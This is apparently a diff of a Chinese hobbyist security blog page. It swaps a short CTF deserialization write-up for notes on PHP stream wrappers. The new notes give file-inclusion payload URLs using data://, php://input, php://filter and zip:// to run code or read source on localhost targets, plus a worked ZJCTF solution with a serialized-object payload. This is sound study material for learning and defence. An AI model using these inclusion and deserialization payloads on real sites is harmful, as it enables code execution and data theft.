@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>SWPUCTF2021新生赛_ez_unserialize |  欲</title>
+      <title>php支持的协议和封装协议 |  欲</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -54,7 +54,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-SWPUCTF2021新生赛-ez-unserialize"
+  id="post-php支持的协议和封装协议"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -65,7 +65,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  SWPUCTF2021新生赛_ez_unserialize
+  php支持的协议和封装协议
 </h1>
  
 
@@ -73,15 +73,15 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2022/04/19/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/" class="article-date">
-  <time datetime="2022-04-19T02:35:56.000Z" itemprop="datePublished">2022-04-19</time>
+      <a href="/2022/04/19/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE/" class="article-date">
+  <time datetime="2022-04-19T03:07:00.000Z" itemprop="datePublished">2022-04-19</time>
 </a>   
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">232</span>
+            <span class="post-count">1.6k</span>
         </span>
     </span>
 
@@ -90,79 +90,225 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">1 分钟</span>
+            <span class="post-count">7 分钟</span>
         </span>
     </span>
 </div>
  
     </div>
       
+    <div class="tocbot"></div>
+
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>#SWPUCTF2021新生赛_ez_unserialize#</p>
-<p>（1）题目</p>
+  <p>#php支持的协议和封装协议（主要是php伪协议）#</p>
+<h2 id="1-data-协议"><a href="#1-data-协议" class="headerlink" title="1 data://协议"></a>1 data://协议</h2><p>（1）data://协议必须双在on才能正常使用；</p>
 <span id="more"></span>
-<pre><code> &lt;?php
 
-error_reporting(0);
-show_source(&quot;cl45s.php&quot;);
+<pre><code>allow_url_fopen ：on
+allow_url_include：on
 
-class wllm&#123;
 
-    public $admin;
-    public $passwd;
+封装协议摘要
+属性                        支持
+受限于allow_url_fopen         No
+受限于allow_url_include    Yes
+允许读取                    Yes
+允许写入                    No
+允许追加                    No
+允许同时读写                No
+支持stat()                No
+支持unlink()                No
+支持rename()                No
+支持mkdir()                No
+支持rmdir()                No
+</code></pre>
+<p>（2）格式：</p>
+<pre><code>http://127.0.0.1/code/1.php?file=data://text/plain,&lt;?php phpinfo()?&gt;
+http://127.0.0.1/code/1.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
 
-    public function __construct()&#123;
-        $this-&gt;admin =&quot;user&quot;;
-        $this-&gt;passwd = &quot;123456&quot;;
-    &#125;
-
-        public function __destruct()&#123;
-        if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123;
-            include(&quot;flag.php&quot;);
-            echo $flag;
-        &#125;else&#123;
-            echo $this-&gt;admin;
-            echo $this-&gt;passwd;
-            echo &quot;Just a bit more!&quot;;
-        &#125;
+$data=&#39;Günther says: 1+1 is 2, 10%40 is 20.&#39;;
+$fp = fopen(&#39;data:text/plain,&#39;.urlencode($data), &#39;rb&#39;); // urlencoded data 
+echostream_get_contents($fp);
+$fp = fopen(&#39;data:text/plain;base64,&#39;.base64_encode($data), &#39;rb&#39;); // base64 encoded data
+echostream_get_contents($fp);
+</code></pre>
+<ul>
+<li>注：不要直接传输原数据，特别是在数据中存在+时，因为PHP会自动对传递的字符串中的所有实体进行urldecode，+在此步骤时丢失我么需要urlencode（）或者base64_encode（）转码在传输</li>
+</ul>
+<p>（3）用法：<br>自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输。</p>
+<p>可以用来绕过file_get_contents()函数，file_get_contents — 将整个文件读入一个字符串。其中如果传入的值为网址，则获取并输出网站首页 HTML 源码。</p>
+<p>##2 php://协议 ##</p>
+<p>（1）封装协议摘要（针对 php://filter，参考被筛选的封装器）</p>
+<pre><code>受限于allow_url_fopen        No
+受限于allow_url_include    仅 php://input、 php://stdin、 php://memory 和 php://temp。
+允许读取    仅 php://stdin、 php://input、 php://fd、 php://memory 和 php://temp。
+允许写入    仅 php://stdout、 php://stderr、 php://output、 php://fd、 php://memory 和php://temp。
+允许追加    仅 php://stdout、 php://stderr、 php://output、 php://fd、 php://memory 和php://temp（等于写入）
+允许同时读写        仅 php://fd、 php://memory 和 php://temp。
+支持 stat()    仅 php://memory 和 php://temp。
+支持 unlink()        No
+支持 rename()        No
+支持 mkdir()        No
+支持 rmdir()        No
+仅仅支持 stream_select()    php://stdin、 php://stdout、 php://stderr、 php://fd 和 php://temp。
+</code></pre>
+<p>不需要开启allow_url_fopen，仅php://input、 php://stdin、 php://memory 和 php://temp 需要开启allow_url_include。php://stdin, php://stdout 和 php://stderr、php://stdin、php://stdout 和 php://stderr 允许直接访问 PHP 进程相应的输入或者输出流。php://stdin 是只读的， php://stdout 和 php://stderr 是只写的。</p>
+<p>php://filter在双off的情况下也可以正常使用；</p>
+<p>allow_url_fopen ：off/on</p>
+<p>allow_url_include：off/on</p>
+<ul>
+<li>注：php:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<strong>php://filter</strong>和<strong>php://input</strong>，php://filter用于读取源码，php://input用于执行php代码。</li>
+</ul>
+<p>（2）格式</p>
+<ul>
+<li>php://filter</li>
+</ul>
+<pre><code>    http://127.0.0.1/cmd.php?file=php://filter/read=convert.base64-encode/resource=./xx.php
+    //输出xx.php的base64的值
+</code></pre>
+<ul>
+<li><p>php://input</p>
+<pre><code>  http://127.0.0.1/cmd.php?file=php://input
+  post传值：&lt;?php phpinfo()?&gt;//php代码，即用来执行PHP代码
+</code></pre>
+</li>
+</ul>
+<h2 id="来个data-协议与php-协议的题目"><a href="#来个data-协议与php-协议的题目" class="headerlink" title="来个data://协议与php://协议的题目"></a>来个data://协议与php://协议的题目</h2><p>（1）[ZJCTF 2019]NiZhuanSiWei</p>
+<pre><code> &lt;?php  
+$text = $_GET[&quot;text&quot;];
+$file = $_GET[&quot;file&quot;];
+$password = $_GET[&quot;password&quot;];
+if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;welcome to the zjctf&quot;))&#123;
+    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;
+    if(preg_match(&quot;/flag/&quot;,$file))&#123;
+        echo &quot;Not now!&quot;;
+        exit(); 
+    &#125;else&#123;
+        include($file);  //useless.php
+        $password = unserialize($password);
+        echo $password;
     &#125;
 &#125;
-
-$p = $_GET[&#39;p&#39;];
-unserialize($p);
-
+else&#123;
+    highlight_file(__FILE__);
+&#125;
 ?&gt; 
 </code></pre>
-<p>php类的相关知识点：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-oop.html">https://www.runoob.com/php/php-oop.html</a></li>
-</ul>
-<p>（2）这道题主要是要通过对p传值来对passwd经行修改，其中传值要通过序列化传值。</p>
-<pre><code> &lt;?php
-class wllm&#123;
-
-    public $admin;
-    public $passwd;
-
-    public function __construct()&#123;
-        $this-&gt;admin =&quot;admin&quot;;
-        $this-&gt;passwd = &quot;ctf&quot;;
-    &#125;
-
-&#125;
-$p= new wllm();
-echo serialize($p);
-
-?&gt;  
-//输出 O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:4:&quot;user&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125; 
+<p>（2）绕过file_get_contents函数</p>
+<p>我们可以用PHP伪协议中的php://input（将post请求中的数据作为PHP代码执行）或者data://（写入协议）对text参数传入welcome to the zjctf</p>
+<pre><code>payload：?text=data://text/plain,welcome%20to%20the%20zjctf
 </code></pre>
-<p>构造payload：?p=O:4:”wllm”:2:{s:5:”admin”;s:5:”admin”;s:6:”passwd”;s:3:”ctf”;}  </p>
-<p>（3）爆出flag。</p>
+<p>（3）利用php://filter协议读取useless.php看看提示</p>
+<pre><code>payload：?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php
+</code></pre>
+<p>得到了一串base64的码。</p>
+<pre><code>PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=
+</code></pre>
+<p>解码得：</p>
+<pre><code>&lt;?php  
+
+class Flag&#123;  //flag.php  
+    public $file;  
+    public function __tostring()&#123;  
+        if(isset($this-&gt;file))&#123;  
+            echo file_get_contents($this-&gt;file); 
+            echo &quot;&lt;br&gt;&quot;;
+        return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+        &#125;  
+    &#125;  
+&#125;  
+?&gt;  
+</code></pre>
+<p>又有一段代码。。。。</p>
+<p>（4）我们需要运用上面的file_get_contents来对flag.php文件进行读取，但file的值又不能有flag。这时我们可以先用include()函数对要用到的文件useless.php进行包含，即让file=useless.php，这样同时也可以绕过正则匹配。</p>
+<p>在对password传值,并利用echo 函数会触发tostring魔术方法，而在此方法中有file get contents函数，只传flag进去发现不行，因此传伪协议进去,出flag。</p>
+<p>序列化一下</p>
+<pre><code>&lt;?php
+ 
+class Flag&#123;  //flag.php  
+    public $file=&quot;flag.php&quot;;    
+ &#125;  
+echo serialize(new Flag);
+?&gt;
+//输出 O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;
+</code></pre>
+<p>构造payload：</p>
+<pre><code>?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;
+</code></pre>
+<p>（5）爆出flag</p>
+<p><img src="https://s2.loli.net/2022/04/21/E1he8ADc95JYopa.png" alt="图片.png"></p>
+<p>输入payload的得到以上界面，查看一下源代码得到flag。</p>
+<ul>
+<li>注：tostring魔术方法</li>
+</ul>
+<p>echo一个对象的时候自动调用该方法。</p>
+<pre><code>    &lt;?php  
+        error_reporting(0);
+        class A&#123;  //flag.php  
+            public $file;  
+            public function __tostring()&#123;  
+                if(isset($this-&gt;file))&#123;  
+                    echo file_get_contents($this-&gt;file); 
+                    echo $this-&gt;file;
+                    echo &quot;&lt;br&gt;&quot;;
+                return (&quot;U R SO CLOSE !///COME ON PLZ&quot;);
+                &#125;  
+            &#125;  
+            
+        &#125;  
+        $p = &#39;O:1:&quot;A&quot;:1:&#123;s:4:&quot;file&quot;;s:3:&quot;123&quot;;&#125;&#39;;
+        $p = unserialize($p);
+        echo $p;
+    ?&gt;  
+</code></pre>
+<p><img src="https://s2.loli.net/2022/04/22/qhbTisEcgVF3oQ1.png" alt="图片.png"></p>
+<h2 id="3-file-协议"><a href="#3-file-协议" class="headerlink" title="3 file://协议"></a>3 file://协议</h2><p>（1）条件</p>
+<p>file:// 协议在双off的情况下也可以正常使用；</p>
+<p>allow_url_fopen ：off/on</p>
+<p>allow_url_include：off/on</p>
+<p><img src="https://s2.loli.net/2022/04/24/ne6XhgkLTduz1fc.png" alt="图片.png"></p>
+<p>（2）格式</p>
+<pre><code>file:// [文件的绝对路径和文件名]
+
+http://127.0.0.1/cmd.php?file=file://D:/soft/phpStudy/WWW/phpcode.txt
+</code></pre>
+<p>（3）用法</p>
+<p>file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响</p>
+<h2 id="4-zip-bzip2-zlib-协议"><a href="#4-zip-bzip2-zlib-协议" class="headerlink" title="4 zip://, bzip2://, zlib://协议"></a>4 zip://, bzip2://, zlib://协议</h2><p>zip://, bzip2://, zlib://协议在双off的情况下也可以正常使用；</p>
+<p>allow_url_fopen ：off/on</p>
+<p>allow_url_include：off/on</p>
+<p>zip://, bzip2://, zlib:// 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名。</p>
+<p><img src="https://s2.loli.net/2022/04/24/yWxQ4pZksc8m5vj.png" alt="图片.png"></p>
+<p>1、zip://</p>
+<p>(1)使用</p>
+<pre><code>zip://archive.zip#dir/file.txt
+
+zip:// [压缩文件绝对路径]#[压缩文件内的子文件名]
+
+http://127.0.0.1/cmd.php?file=zip://D:/soft/phpStudy/WWW/file.jpg%23phpcode.txt
+</code></pre>
+<p>先将要执行的PHP代码写好文件名为xx.txt，将xx.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。</p>
+<p>2、bzip2://协议</p>
+<p>（1）使用</p>
+<pre><code>compress.bzip2://file.bz2
+
+http://127.0.0.1/cmd.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg
+
+http://127.0.0.1/cmd.php?file=compress.bzip2://./file.jpg
+</code></pre>
+<p>3、zlib://协议</p>
+<p>（1）使用</p>
+<pre><code>compress.zlib://file.gz
+
+http://127.0.0.1/cmd.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg
+
+http://127.0.0.1/cmd.php?file=compress.zlib://./file.jpg
+</code></pre>
  
       <!-- reward -->
       
@@ -233,12 +379,12 @@ echo serialize($p);
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/04/19/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/04/19/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE/" alt="微信分享二维码">
     </div>
 </div>
 
 <div id="share-mask"></div>  
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E9%A2%98%E7%9B%AE/" rel="tag">题目</a></li></ul>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag">笔记</a></li></ul>
 
     </footer>
   </div>
@@ -246,19 +392,10 @@ echo serialize($p);
    
   <nav class="article-nav">
     
-      <a href="/2022/04/19/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            php支持的协议和封装协议
-          
-        </div>
-      </a>
     
-    
-      <a href="/2022/03/17/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="article-nav-link">
+      <a href="/2022/04/19/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9B-ez-unserialize/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">强网杯2019_随便注</div>
+        <div class="article-nav-title">SWPUCTF2021新生赛_ez_unserialize</div>
       </a>
     
   </nav>
